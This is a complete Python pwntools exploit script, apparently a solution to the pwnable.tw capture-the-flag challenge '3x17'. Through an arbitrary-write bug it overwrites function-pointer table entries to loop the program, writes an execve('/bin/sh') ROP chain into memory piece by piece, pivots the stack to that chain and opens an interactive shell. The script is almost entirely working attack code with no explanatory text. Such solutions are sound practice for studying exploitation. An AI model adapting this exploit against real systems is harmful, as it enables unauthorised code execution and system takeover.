from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './3x17'
e = ELF(file)
libc = e.libc
ip = 'chall.pwnable.tw'
port = '10105'
local = 1


def dbg(code=""):
    if local == 0:
        return
    gdb.attach(p, code)


def run():
    global p
    if local == 1:
        p = process(file)
    else:
        p = remote(ip, port)


se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=0.5)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
un64 = lambda x: u64(x.ljust(8, '\x00'))
un32 = lambda x: u32(x.ljust(4, '\x00'))

run()

rc()

def bypass():
    while True:
        if rc != '':
            return

sl(str(0x4b40f0))
rc()
# dbg("b*0x402988")
sl(p64(0x402960)+p64(0x401B6D))
prax=0x41e4af
prdi=0x401696
prsi=0x406c30
prdxrsi=0x44a309

rop_chain=p64(prax)+p64(0x3b)+p64(prdi)+p64(0x4b4140)+p64(prdxrsi)+p64(0)+p64(0)+p64(0x4131B4)+'/bin/sh\x00'
print len(rop_chain)
#dbg('b*0x401C29')
for i in range(3):
    rc()
    sl(str(0x4b4100+i*0x18))
    rc()
    se(rop_chain[i*0x18:i*0x18+0x18])

sl(str(0x4b40f0))
rc()
#dbg('b*0x401c4b')
se(p64(0x401c4b)+p64(0x401c4c))
shell()
